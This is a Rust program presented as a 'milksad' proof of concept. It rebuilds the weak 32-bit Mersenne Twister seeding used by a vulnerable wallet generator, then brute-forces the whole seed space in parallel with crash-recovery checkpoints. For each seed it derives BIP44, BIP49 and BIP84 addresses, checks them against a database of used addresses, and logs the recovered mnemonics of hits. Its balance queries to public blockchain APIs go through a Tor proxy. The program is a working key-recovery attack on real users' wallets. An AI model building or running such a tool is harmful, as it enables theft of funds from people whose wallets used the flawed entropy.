use bip39::{Language, Mnemonic};
use bitcoin::network::constants::Network;
use bitcoin::secp256k1::Secp256k1;
use bitcoin::util::address::Address;
use bitcoin::util::bip32::{DerivationPath, ExtendedPrivKey};
use bitcoin::PublicKey;
use bitcoin_scan::{decode_address, ReadOnlyDatabase, ReadableDatabase, DEFAULT_DB_PATH};
use fastbloom::BloomFilter;
use hex::ToHex;
use mersenne_twister::MT19937;
use rand::{Rng, SeedableRng};
use rayon::prelude::*;
use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::env;
use std::fs::{File, OpenOptions};
use std::io::{BufRead, BufReader, Write};
use std::str::FromStr;
use std::sync::atomic::{AtomicU32, AtomicU64, Ordering};
use std::sync::Arc;
use std::sync::Mutex;
use std::time::Duration;
use tracing::{debug, error, info, warn};
use tracing_subscriber::{fmt, EnvFilter};

/// Checkpoint structure for crash recovery
#[derive(Debug, Serialize, Deserialize)]
struct Checkpoint {
    last_seed: u32,
    entropy_bits: usize,
    checked_count: u64,
    found_count: u32,
}

/// Stats structure from mempool.space API
#[derive(Debug, Deserialize, Serialize)]
struct AddressStats {
    funded_txo_count: u64,
    funded_txo_sum: u64,
    spent_txo_count: u64,
    spent_txo_sum: u64,
    tx_count: u64,
}

/// Full response structure from mempool.space /api/address/:address
#[derive(Debug, Deserialize, Serialize)]
struct AddressInfo {
    address: String,
    chain_stats: AddressStats,
    mempool_stats: AddressStats,
}

/// blockchain.info API response
#[derive(Debug, Deserialize)]
struct BlockchainInfoAddress {
    final_balance: u64,
    n_tx: u64,
    total_received: u64,
    total_sent: u64,
}

/// BlockCypher API response
#[derive(Debug, Deserialize)]
struct BlockCypherAddress {
    address: String,
    balance: u64,
    total_received: u64,
    total_sent: u64,
    n_tx: u64,
    unconfirmed_balance: u64,
}

/// Local API address response
#[derive(Debug, Deserialize)]
struct LocalAddressInfo {
    address: String,
    info: Option<serde_json::Value>,
}

/// Check if address exists in local database via API
fn check_address_exists_local<T: ReadableDatabase>(
    db: &T,
    address: &str,
) -> Result<bool, Box<dyn std::error::Error>> {
    // print!("Checking local DB for address: {} ... ", address);
    if let Some(raw_bytes) = decode_address(address) {
        // Check if key already exists
        if !db.exists(&raw_bytes).unwrap_or(false) {
            return Ok(false);
        }
        let info: Option<Vec<u8>> = db.get(raw_bytes).unwrap_or(None);
        return Ok(info.is_some());
    } else {
        // For bech32 addresses that can't be decoded, return false instead of error
        if address.starts_with("bc1") {
            debug!("Bech32 address could not be decoded: {}", address);
            return Ok(false);
        }
        return Err("Invalid address format".into());
    }
}

/// Fetch address balance and details from mempool.space API
fn get_address_balance(address: &str) -> Result<AddressInfo, Box<dyn std::error::Error>> {
    let url: String = format!("https://mempool.space/api/address/{}", address);
    let client = Client::builder()
        .proxy(reqwest::Proxy::all("socks5://127.0.0.1:9050")?)
        .timeout(Duration::from_secs(60))
        .build()?;
    let response = client.get(&url).send()?;

    if !response.status().is_success() {
        return Err(format!("API returned status: {}", response.status()).into());
    }

    let address_info: AddressInfo = response.json()?;
    Ok(address_info)
}

/// Calculate current balance from address info
fn calculate_balance(info: &AddressInfo) -> i64 {
    let chain_balance =
        info.chain_stats.funded_txo_sum as i64 - info.chain_stats.spent_txo_sum as i64;
    let mempool_balance =
        info.mempool_stats.funded_txo_sum as i64 - info.mempool_stats.spent_txo_sum as i64;
    chain_balance + mempool_balance
}

/// Fetch address balance from blockchain.info API
fn get_balance_blockchain_info(
    address: &str,
) -> Result<BlockchainInfoAddress, Box<dyn std::error::Error>> {
    let url = format!("https://blockchain.info/rawaddr/{}", address);
    let client = Client::builder()
        .proxy(reqwest::Proxy::all("socks5://127.0.0.1:9050")?)
        .timeout(Duration::from_secs(60))
        .build()?;
    let response = client.get(&url).send()?;

    if !response.status().is_success() {
        return Err(format!("API returned status: {}", response.status()).into());
    }

    let address_info: BlockchainInfoAddress = response.json()?;
    Ok(address_info)
}

/// Fetch address balance from BlockCypher API
fn get_balance_blockcypher(
    address: &str,
) -> Result<BlockCypherAddress, Box<dyn std::error::Error>> {
    let url = format!("https://api.blockcypher.com/v1/btc/main/addrs/{}", address);
    let client = Client::builder()
        .proxy(reqwest::Proxy::all("socks5://127.0.0.1:9050")?)
        .timeout(Duration::from_secs(60))
        .build()?;
    let response = client.get(&url).send()?;

    if !response.status().is_success() {
        return Err(format!("API returned status: {}", response.status()).into());
    }

    let address_info: BlockCypherAddress = response.json()?;
    Ok(address_info)
}

/// Try multiple APIs with fallback
fn get_balance_with_fallback(
    address: &str,
) -> Result<(String, String), Box<dyn std::error::Error>> {
    // Try mempool.space first
    debug!("Trying mempool.space API for address: {}", address);
    match get_address_balance(address) {
        Ok(info) => {
            // Only process balance if there are transactions
            if info.chain_stats.tx_count == 0 && info.mempool_stats.tx_count == 0 {
                debug!("No transactions found for address: {}", address);
                return Ok((
                    "0".to_string(),
                    "Source: mempool.space\nNo transactions found for this address".to_string(),
                ));
            }

            let balance_sats = calculate_balance(&info);
            let balance_btc = balance_sats as f64 / 100_000_000.0;

            let details = format!(
                "Source: mempool.space\n\
                Chain Stats:\n\
                  Transactions: {}\n\
                  Funded TXO Count: {}\n\
                  Funded Sum: {} sats\n\
                  Spent TXO Count: {}\n\
                  Spent Sum: {} sats\n\
                Mempool Stats:\n\
                  Transactions: {}\n\
                  Funded TXO Count: {}\n\
                  Funded Sum: {} sats\n\
                  Spent TXO Count: {}\n\
                  Spent Sum: {} sats",
                info.chain_stats.tx_count,
                info.chain_stats.funded_txo_count,
                info.chain_stats.funded_txo_sum,
                info.chain_stats.spent_txo_count,
                info.chain_stats.spent_txo_sum,
                info.mempool_stats.tx_count,
                info.mempool_stats.funded_txo_count,
                info.mempool_stats.funded_txo_sum,
                info.mempool_stats.spent_txo_count,
                info.mempool_stats.spent_txo_sum
            );

            info!("Balance found via mempool.space: {} sats", balance_sats);
            return Ok((format!("{}", balance_sats), details));
        }
        Err(e) => {
            warn!("mempool.space API error for {}: {}", address, e);
        }
    }

    // Try blockchain.info
    debug!("Trying blockchain.info API for address: {}", address);
    match get_balance_blockchain_info(address) {
        Ok(info) => {
            // Only process balance if there are transactions
            if info.n_tx == 0 {
                debug!("No transactions found for address: {}", address);
                return Ok((
                    "0".to_string(),
                    "Source: blockchain.info\nNo transactions found for this address".to_string(),
                ));
            }

            let balance_btc = info.final_balance as f64 / 100_000_000.0;

            let details = format!(
                "Source: blockchain.info\n\
                Transactions: {}\n\
                Total Received: {} sats\n\
                Total Sent: {} sats",
                info.n_tx, info.total_received, info.total_sent
            );

            info!(
                "Balance found via blockchain.info: {} sats",
                info.final_balance
            );
            if info.final_balance == 0 {
                debug!("Zero balance from blockchain.info for address: {}", address);
                return Ok(("0".to_string(), details));
            }

            return Ok((format!("${}", info.final_balance), details));
        }
        Err(e) => {
            warn!("blockchain.info API error for {}: {}", address, e);
        }
    }

    // Try BlockCypher
    debug!("Trying BlockCypher API for address: {}", address);
    match get_balance_blockcypher(address) {
        Ok(info) => {
            // Only process balance if there are transactions
            if info.n_tx == 0 {
                debug!("No transactions found for address: {}", address);
                return Ok((
                    "0".to_string(),
                    "Source: BlockCypher\nNo transactions found for this address".to_string(),
                ));
            }

            let balance_btc = info.balance as f64 / 100_000_000.0;
            let unconfirmed_btc = info.unconfirmed_balance as f64 / 100_000_000.0;

            let details = format!(
                "Source: BlockCypher\n\
                Transactions: {}\n\
                Total Received: {} sats\n\
                Total Sent: {} sats\n\
                Unconfirmed Balance: {} sats ({:.8} BTC)",
                info.n_tx,
                info.total_received,
                info.total_sent,
                info.unconfirmed_balance,
                unconfirmed_btc
            );

            info!("Balance found via BlockCypher: {} sats", info.balance);
            if info.balance == 0 {
                debug!("Zero balance from BlockCypher for address: {}", address);
                return Ok(("0".to_string(), details));
            }
            return Ok((format!("${}", info.balance), details));
        }
        Err(e) => {
            error!("BlockCypher API error for {}: {}", address, e);
        }
    }

    error!("All APIs failed for address: {}", address);
    Err("All APIs failed".into())
}

/// C++ std::mt19937 compatible implementation
struct CppMt19937 {
    mt: [u32; 624],
    index: usize,
}

impl CppMt19937 {
    fn new(seed: u32) -> Self {
        let mut mt = [0u32; 624];
        mt[0] = seed;
        for i in 1..624 {
            let prev = mt[i - 1];
            mt[i] = 1812433253u32
                .wrapping_mul(prev ^ (prev >> 30))
                .wrapping_add(i as u32);
        }
        Self { mt, index: 624 }
    }

    fn gen(&mut self) -> u32 {
        if self.index >= 624 {
            self.twist();
        }
        let mut y = self.mt[self.index];
        self.index += 1;

        // Tempering
        y ^= y >> 11;
        y ^= (y << 7) & 0x9d2c5680;
        y ^= (y << 15) & 0xefc60000;
        y ^= y >> 18;
        y
    }

    fn twist(&mut self) {
        for i in 0..624 {
            let y = (self.mt[i] & 0x80000000) | (self.mt[(i + 1) % 624] & 0x7fffffff);
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1);
            if y % 2 != 0 {
                self.mt[i] ^= 0x9908b0df;
            }
        }
        self.index = 0;
    }
}

/// Produce N bytes from MT19937 (32-bit) by repeatedly drawing 32-bit words.
/// This mimics the vulnerable code: seed mt19937 with a 32-bit seed, then
/// take bytes from the PRNG to form an entropy buffer using std::uniform_int_distribution<uint16_t>(0, 255)
fn mt19937_bytes_from_seed(seed: u32, out_len: usize) -> Vec<u8> {
    let mut mt = CppMt19937::new(seed);
    let mut out = Vec::with_capacity(out_len);
    
    // std::uniform_int_distribution<uint16_t>(0, 255) implementation
    // For range [0, 255], this is a power of 2 minus 1, so it uses rejection sampling
    // However, 256 is a power of 2, so we can use masking efficiently
    // The C++ implementation for [0, 255] typically just masks the lower 8 bits
    for _ in 0..out_len {
        let v = mt.gen();
        out.push((v & 0xFF) as u8);
    }
    out
}

/// Convert bytes (entropy) into a BIP39 mnemonic (English).
/// We expect `entropy` bit-length to be one of allowed lengths (128,160,192,224,256).
fn entropy_to_mnemonic(entropy: &[u8]) -> Mnemonic {
    // Construct mnemonic from raw entropy bytes
    Mnemonic::from_entropy_in(Language::English, entropy).expect("Failed to build mnemonic")
}

/// Derive the first external (0) address for BIP44 m/44'/0'/0'/0/0 using mnemonic.
/// This uses BIP39 -> seed -> BIP32 to derive an xprv and get address.
/// Returns P2PKH address (legacy, starts with 1)
fn mnemonic_to_bip44_addr(mnemonic: &Mnemonic) -> Address {
    // BIP39 seed (no passphrase)
    let passphrase = "";
    let seed = mnemonic.to_seed(passphrase);

    // Use bitcoin crate to derive m/44'/0'/0'/0/0
    let network = Network::Bitcoin;
    let secp = Secp256k1::new();
    let xprv = ExtendedPrivKey::new_master(network, &seed).expect("xprv master");

    // BIP44 path m/44'/0'/0'/0/0
    let path = DerivationPath::from_str("m/44'/0'/0'/0/0").expect("derivation path");

    let child = xprv.derive_priv(&secp, &path).expect("derive child");
    let secp_pubkey = child.private_key.public_key(&secp);
    let pubkey = PublicKey::new(secp_pubkey);
    Address::p2pkh(&pubkey, network)
}

/// Derive the first external (0) address for BIP49 m/49'/0'/0'/0/0 using mnemonic.
/// Returns P2SH-P2WPKH address (SegWit wrapped, starts with 3)
fn mnemonic_to_bip49_addr(mnemonic: &Mnemonic) -> Address {
    let passphrase = "";
    let seed = mnemonic.to_seed(passphrase);
    let network = Network::Bitcoin;
    let secp = Secp256k1::new();
    let xprv = ExtendedPrivKey::new_master(network, &seed).expect("xprv master");

    // BIP49 path m/49'/0'/0'/0/0
    let path = DerivationPath::from_str("m/49'/0'/0'/0/0").expect("derivation path");

    let child = xprv.derive_priv(&secp, &path).expect("derive child");
    let secp_pubkey = child.private_key.public_key(&secp);
    let pubkey = PublicKey::new(secp_pubkey);
    Address::p2shwpkh(&pubkey, network).expect("p2shwpkh address")
}

/// Derive the first external (0) address for BIP84 m/84'/0'/0'/0/0 using mnemonic.
/// Returns P2WPKH address (native SegWit, starts with bc1q)
fn mnemonic_to_bip84_addr(mnemonic: &Mnemonic) -> Address {
    let passphrase = "";
    let seed = mnemonic.to_seed(passphrase);
    let network = Network::Bitcoin;
    let secp = Secp256k1::new();
    let xprv = ExtendedPrivKey::new_master(network, &seed).expect("xprv master");

    // BIP84 path m/84'/0'/0'/0/0
    let path = DerivationPath::from_str("m/84'/0'/0'/0/0").expect("derivation path");

    let child = xprv.derive_priv(&secp, &path).expect("derive child");
    let secp_pubkey = child.private_key.public_key(&secp);
    let pubkey = PublicKey::new(secp_pubkey);
    Address::p2wpkh(&pubkey, network).expect("p2wpkh address")
}

/// Derive all three BIP standard addresses from mnemonic
fn mnemonic_to_all_addrs(mnemonic: &Mnemonic) -> Vec<(String, Address)> {
    vec![
        ("BIP44".to_string(), mnemonic_to_bip44_addr(mnemonic)),
        ("BIP49".to_string(), mnemonic_to_bip49_addr(mnemonic)),
        ("BIP84".to_string(), mnemonic_to_bip84_addr(mnemonic)),
    ]
}

fn print_usage_and_exit() -> ! {
    eprintln!("Usage:");
    eprintln!("  Single seed:  milksad_poc_demo <seed_u32> [entropy_bits]");
    eprintln!("  Brute force:  milksad_poc_demo --brute <start_seed> <end_seed> [entropy_bits] [--threads <num>]");
    eprintln!("  Brute all:    milksad_poc_demo --brute-all [entropy_bits] [--threads <num>]");
    eprintln!("\nOptions:");
    eprintln!("  --threads <num>   Number of threads to use (default: CPU count)");
    eprintln!("\nExamples:");
    eprintln!("  milksad_poc_demo 1697059200 256");
    eprintln!("  milksad_poc_demo --brute 0 1000000 256");
    eprintln!("  milksad_poc_demo --brute 1697059000 1697060000 --threads 8");
    eprintln!("  milksad_poc_demo --brute-all 256 --threads 16");
    std::process::exit(2);
}

/// Log checked address to file
fn log_address_to_file(
    file: &Mutex<std::fs::File>,
    seed: u32,
    entropy_hex: &str,
    mnemonic: &str,
    address: &str,
    bip_type: &str,
    balance: Option<&str>,
) {
    if let Ok(mut file) = file.lock() {
        let log_entry = if let Some(bal) = balance {
            format!("{},{},{},{}\n", seed, bip_type, address, bal)
        } else {
            format!("{},{},{},\n", seed, bip_type, address)
        };

        if let Err(e) = file.write_all(log_entry.as_bytes()) {
            error!("Failed to write to log file: {}", e);
        }
    }
}

/// Save checkpoint to file
fn save_checkpoint(checkpoint_file: &str, checkpoint: &Checkpoint) {
    if let Ok(json) = serde_json::to_string_pretty(checkpoint) {
        if let Err(e) = std::fs::write(checkpoint_file, json) {
            error!("Failed to save checkpoint: {}", e);
        }
    }
}

/// Load checkpoint from file
fn load_checkpoint(checkpoint_file: &str) -> Option<Checkpoint> {
    if let Ok(content) = std::fs::read_to_string(checkpoint_file) {
        if let Ok(checkpoint) = serde_json::from_str::<Checkpoint>(&content) {
            return Some(checkpoint);
        }
    }
    None
}

fn main() {
    // Initialize tracing with thread IDs
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env().add_directive(tracing::Level::INFO.into()))
        .with_thread_ids(true)
        .with_thread_names(true)
        .init();

    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        print_usage_and_exit();
    }

    let db = ReadOnlyDatabase::open(&DEFAULT_DB_PATH, true).expect("Cannot open DB");

    // Parse --threads argument if present
    let mut custom_threads: Option<usize> = None;
    for i in 0..args.len() {
        if args[i] == "--threads" && i + 1 < args.len() {
            custom_threads = Some(
                args[i + 1]
                    .parse()
                    .expect("threads must be a positive integer"),
            );
            break;
        }
    }

    // Configure thread pool if custom threads specified
    if let Some(num_threads) = custom_threads {
        rayon::ThreadPoolBuilder::new()
            .num_threads(num_threads)
            .build_global()
            .expect("Failed to configure thread pool");
        info!("Using {} custom threads", num_threads);
    }

    // Parse --bloom argument or check for dumptxoutset
    // let mut bloom_file: Option<String> = None;
    // for i in 0..args.len() {
    //     if args[i] == "--bloom" && i + 1 < args.len() {
    //         bloom_file = Some(args[i + 1].clone());
    //         break;
    //     }
    // }
    // if bloom_file.is_none() && std::path::Path::new("dumptxoutset").exists() {
    //     bloom_file = Some("dumptxoutset".to_string());
    // }
    // let bloom_filter = bloom_file.map(|path| Arc::new(load_bloom_filter(&path)));

    // Check for brute-all mode (entire 2^32 space)
    if args[1] == "--brute-all" {
        let entropy_bits: usize = if args.len() >= 3 {
            args[2]
                .parse()
                .expect("entropy bits must be integer (128/160/192/224/256)")
        } else {
            256
        };

        if ![128, 160, 192, 224, 256].contains(&entropy_bits) {
            eprintln!("entropy_bits must be one of 128,160,192,224,256");
            std::process::exit(1);
        }
        let entropy_bytes = entropy_bits / 8;

        // Load existing addresses from log file
        let log_filename = format!("brute_force_all_{}.log", entropy_bits);
        let checkpoint_filename = format!("brute_force_all_{}.checkpoint", entropy_bits);
        
        // Load checkpoint if exists
        let (start_seed, initial_checked, initial_found) = if let Some(checkpoint) = load_checkpoint(&checkpoint_filename) {
            if checkpoint.entropy_bits == entropy_bits {
                info!("Resuming from checkpoint: seed={}, checked={}, found={}", 
                    checkpoint.last_seed, checkpoint.checked_count, checkpoint.found_count);
                (checkpoint.last_seed + 1, checkpoint.checked_count, checkpoint.found_count)
            } else {
                warn!("Checkpoint entropy_bits mismatch. Starting from beginning.");
                (0, 0, 0)
            }
        } else {
            (0, 0, 0)
        };

        // Create log file
        let log_file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_filename)
            .expect("Failed to create log file");
        let log_file = Arc::new(Mutex::new(log_file));

        info!("=== Brute Force ALL Mode (Full 2^32 Space) ===");
        info!("Start seed: {}", start_seed);
        info!("End seed: {}", u32::MAX);
        info!("Entropy bits: {}", entropy_bits);
        info!("Total seeds to check: {}", (u32::MAX as u64) + 1 - (start_seed as u64));
        info!(
            "Using multi-threading with {} threads",
            rayon::current_num_threads()
        );
        info!("Logging to: {}", log_filename);
        info!("Checkpoint file: {}", checkpoint_filename);
        info!("Starting brute force...\n");

        let checked = Arc::new(AtomicU64::new(initial_checked));
        let found = Arc::new(AtomicU32::new(initial_found));
        let report_interval = 1000;
        let chunk_size: u32 = 10_000;
        
        // Process in chunks for safe checkpointing
        let mut current_seed: u64 = start_seed as u64;
        let max_seed: u64 = u32::MAX as u64;
        
        while current_seed <= max_seed {
            let chunk_start = current_seed as u32;
            let chunk_end = std::cmp::min(current_seed + chunk_size as u64 - 1, max_seed) as u32;
            
            info!("Processing chunk: {} to {}", chunk_start, chunk_end);
            
            // Process this chunk in parallel
            (chunk_start..=chunk_end).into_par_iter().for_each(|seed| {
                debug!("Processing seed: {}", seed);
                let entropy = mt19937_bytes_from_seed(seed, entropy_bytes);
                let entropy_hex = entropy.encode_hex::<String>();
                let mnemonic = entropy_to_mnemonic(&entropy);
                let addresses = mnemonic_to_all_addrs(&mnemonic);

                let current_checked = checked.fetch_add(1, Ordering::Relaxed);

                // Report progress
                if current_checked % report_interval == 0 {
                    let current_found = found.load(Ordering::Relaxed);
                    info!(
                        "Progress: checked={}, found={}, current_seed={}",
                        current_checked, current_found, seed
                    );
                }

                // Check all BIP addresses in local DB
                for (bip_type, address) in &addresses {
                    match check_address_exists_local(&db, &address.to_string()) {
                        Ok(exists) => {
                            if exists {
                                let new_found = found.fetch_add(1, Ordering::Relaxed) + 1;
                                info!("╔═══════════════════════════════════════════════════════════════╗");
                                info!("║ FOUND ADDRESS IN LOCAL DATABASE!");
                                info!("╚═══════════════════════════════════════════════════════════════╝");
                                info!("Seed: {}", seed);
                                info!("BIP Type: {}", bip_type);
                                info!("Address: {}", address);
                                info!("Mnemonic: {}", mnemonic);
                                info!("Total found so far: {}", new_found);
                                info!("═══════════════════════════════════════════════════════════════\n");
                                log_address_to_file(
                                    &log_file,
                                    seed,
                                    &entropy_hex,
                                    &mnemonic.to_string(),
                                    &address.to_string(),
                                    bip_type,
                                    Some("found in local DB"),
                                );
                            }
                        }
                        Err(e) => {
                            error!("Error checking local DB for {} {}: {}", bip_type, address, e);
                        }
                    }
                }
            });
            
            // After chunk completes, save checkpoint
            let checkpoint = Checkpoint {
                last_seed: chunk_end,
                entropy_bits,
                checked_count: checked.load(Ordering::Relaxed),
                found_count: found.load(Ordering::Relaxed),
            };
            save_checkpoint(&checkpoint_filename, &checkpoint);
            info!("Checkpoint saved after processing seed {}", chunk_end);
            
            current_seed = chunk_end as u64 + 1;
        }

        info!("\n=== Brute Force Complete ===");
        info!("Total seeds checked: {}", checked.load(Ordering::Relaxed));
        info!("Addresses with balance: {}", found.load(Ordering::Relaxed));
        
        // Remove checkpoint file on completion
        if let Err(e) = std::fs::remove_file(&checkpoint_filename) {
            debug!("Failed to remove checkpoint file: {}", e);
        } else {
            info!("Checkpoint file removed.");
        }
        return;
    }

    // Check for brute force mode with range
    if args[1] == "--brute" {
        if args.len() < 4 {
            print_usage_and_exit();
        }

        let start_seed: u32 = args[2]
            .parse()
            .expect("start_seed must be an integer (u32)");
        let end_seed: u32 = args[3].parse().expect("end_seed must be an integer (u32)");
        let entropy_bits: usize = if args.len() >= 5 {
            args[4]
                .parse()
                .expect("entropy bits must be integer (128/160/192/224/256)")
        } else {
            256
        };

        if ![128, 160, 192, 224, 256].contains(&entropy_bits) {
            eprintln!("entropy_bits must be one of 128,160,192,224,256");
            std::process::exit(1);
        }
        let entropy_bytes = entropy_bits / 8;

        // Load existing addresses from log file
        let log_filename = format!("brute_force_{}_{}.log", start_seed, end_seed);
        let checkpoint_filename = format!("brute_force_{}_{}.checkpoint", start_seed, end_seed);

        // Load checkpoint if exists
        let (resume_seed, initial_checked, initial_found) = if let Some(checkpoint) = load_checkpoint(&checkpoint_filename) {
            if checkpoint.entropy_bits == entropy_bits && checkpoint.last_seed >= start_seed && checkpoint.last_seed < end_seed {
                info!("Resuming from checkpoint: seed={}, checked={}, found={}", 
                    checkpoint.last_seed, checkpoint.checked_count, checkpoint.found_count);
                (checkpoint.last_seed + 1, checkpoint.checked_count, checkpoint.found_count)
            } else {
                warn!("Checkpoint invalid or out of range. Starting from beginning.");
                (start_seed, 0, 0)
            }
        } else {
            (start_seed, 0, 0)
        };

        // Create log file
        let log_file = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&log_filename)
            .expect("Failed to create log file");
        let log_file = Arc::new(Mutex::new(log_file));

        info!("=== Brute Force Mode (Multi-threaded) ===");
        info!("Start seed: {}", resume_seed);
        info!("End seed: {}", end_seed);
        info!("Entropy bits: {}", entropy_bits);
        info!(
            "Total seeds to check: {}",
            (end_seed as u64) - (resume_seed as u64) + 1
        );
        info!("Using {} threads", rayon::current_num_threads());
        info!("Logging to: {}", log_filename);
        info!("Checkpoint file: {}", checkpoint_filename);
        info!("Starting brute force...\n");

        let checked = Arc::new(AtomicU64::new(initial_checked));
        let found = Arc::new(AtomicU32::new(initial_found));
        let report_interval = 1000;
        let chunk_size: u32 = 10_000;
        
        // Process in chunks for safe checkpointing
        let mut current_seed: u64 = resume_seed as u64;
        let max_seed: u64 = end_seed as u64;
        
        while current_seed <= max_seed {
            let chunk_start = current_seed as u32;
            let chunk_end = std::cmp::min(current_seed + chunk_size as u64 - 1, max_seed) as u32;
            
            info!("Processing chunk: {} to {}", chunk_start, chunk_end);
            
            // Process this chunk in parallel
            (chunk_start..=chunk_end).into_par_iter().for_each(|seed| {
                debug!("Processing seed: {}", seed);
                let entropy = mt19937_bytes_from_seed(seed, entropy_bytes);
                let entropy_hex = entropy.encode_hex::<String>();
                let mnemonic = entropy_to_mnemonic(&entropy);
                let addresses = mnemonic_to_all_addrs(&mnemonic);

                let current_checked = checked.fetch_add(1, Ordering::Relaxed);

                // Report progress
                if current_checked % report_interval == 0 {
                    let current_found = found.load(Ordering::Relaxed);
                    info!(
                        "Progress: checked={}, found={}, current_seed={}",
                        current_checked, current_found, seed
                    );
                }

                // Check all BIP addresses in local DB
                for (bip_type, address) in &addresses {
                    match check_address_exists_local(&db, &address.to_string()) {
                        Ok(exists) => {
                            if exists {
                                let new_found = found.fetch_add(1, Ordering::Relaxed) + 1;
                                info!("╔═══════════════════════════════════════════════════════════════╗");
                                info!("║ FOUND ADDRESS IN LOCAL DATABASE!");
                                info!("╚═══════════════════════════════════════════════════════════════╝");
                                info!("Seed: {}", seed);
                                info!("BIP Type: {}", bip_type);
                                info!("Address: {}", address);
                                info!("Mnemonic: {}", mnemonic);
                                info!("Total found so far: {}", new_found);
                                info!("═══════════════════════════════════════════════════════════════\n");
                                log_address_to_file(
                                    &log_file,
                                    seed,
                                    &entropy_hex,
                                    &mnemonic.to_string(),
                                    &address.to_string(),
                                    bip_type,
                                    Some("found in local DB"),
                                );
                            }
                        }
                        Err(e) => {
                            error!("Error checking local DB for {} {}: {}", bip_type, address, e);
                        }
                    }
                }
            });
            
            // After chunk completes, save checkpoint
            let checkpoint = Checkpoint {
                last_seed: chunk_end,
                entropy_bits,
                checked_count: checked.load(Ordering::Relaxed),
                found_count: found.load(Ordering::Relaxed),
            };
            save_checkpoint(&checkpoint_filename, &checkpoint);
            info!("Checkpoint saved after processing seed {}", chunk_end);
            
            current_seed = chunk_end as u64 + 1;
        }

        info!("\n=== Brute Force Complete ===");
        info!("Total seeds checked: {}", checked.load(Ordering::Relaxed));
        info!("Addresses with balance: {}", found.load(Ordering::Relaxed));
        
        // Remove checkpoint file on completion
        if let Err(e) = std::fs::remove_file(&checkpoint_filename) {
            debug!("Failed to remove checkpoint file: {}", e);
        } else {
            info!("Checkpoint file removed.");
        }
        return;
    }

    // Single seed mode (original behavior)
    let seed_u32: u32 = args[1].parse().expect("seed must be an integer (u32)");
    let entropy_bits: usize = if args.len() >= 3 {
        args[2]
            .parse()
            .expect("entropy bits must be integer (128/160/192/224/256)")
    } else {
        256
    }; // default to 256 bits (32 bytes)

    if ![128, 160, 192, 224, 256].contains(&entropy_bits) {
        eprintln!("entropy_bits must be one of 128,160,192,224,256");
        std::process::exit(1);
    }
    let entropy_bytes = entropy_bits / 8;

    // Produce entropy from MT19937 seeded with seed_u32
    let entropy = mt19937_bytes_from_seed(seed_u32, entropy_bytes);

    info!("Seed (u32): {}", seed_u32);
    info!("Entropy (hex): {}", entropy.encode_hex::<String>());
    info!("Entropy (len bytes): {}", entropy.len());

    // Build mnemonic from entropy
    let mnemonic = entropy_to_mnemonic(&entropy);
    info!("Mnemonic: {}", mnemonic.to_string());

    info!("\n=== Deriving Bitcoin Addresses ===");
    // let bip39_addr = mnemonic_to_bip39_addr(&mnemonic);
    // info!("BIP39 Address (P2PKH): {}", bip39_addr);

    let bip44_addr = mnemonic_to_bip44_addr(&mnemonic);
    info!("BIP44 Address (P2PKH): {}", bip44_addr);
    let bip49_addr = mnemonic_to_bip49_addr(&mnemonic);
    info!("BIP49 Address (P2SH-P2WPKH): {}", bip49_addr);
    let bip84_addr = mnemonic_to_bip84_addr(&mnemonic);
    info!("BIP84 Address (P2WPKH): {}", bip84_addr);

    // Derive all Bitcoin addresses
    // let addresses = mnemonic_to_all_addrs(&mnemonic);
    // info!("\n=== Derived Bitcoin Addresses ===");
    // for (bip_type, address) in &addresses {
    //     info!("{}: {}", bip_type, address);
    // }

    // Fetch balance for all addresses
    // info!("\n=== Fetching Balances ===");
    // for (bip_type, address) in &addresses {
    //     info!("\nChecking {} address: {}", bip_type, address);
    //     match get_balance_with_fallback(&address.to_string()) {
    //         Ok((balance, details)) => {
    //             info!("\n=== {} Address Information ===", bip_type);
    //             info!("{}", details);
    //             info!("\n=== Current Balance ===");
    //             info!("Balance: {}", balance);
    //         }
    //         Err(e) => {
    //             error!("Error fetching {} address balance: {}", bip_type, e);
    //         }
    //     }
    // }
}
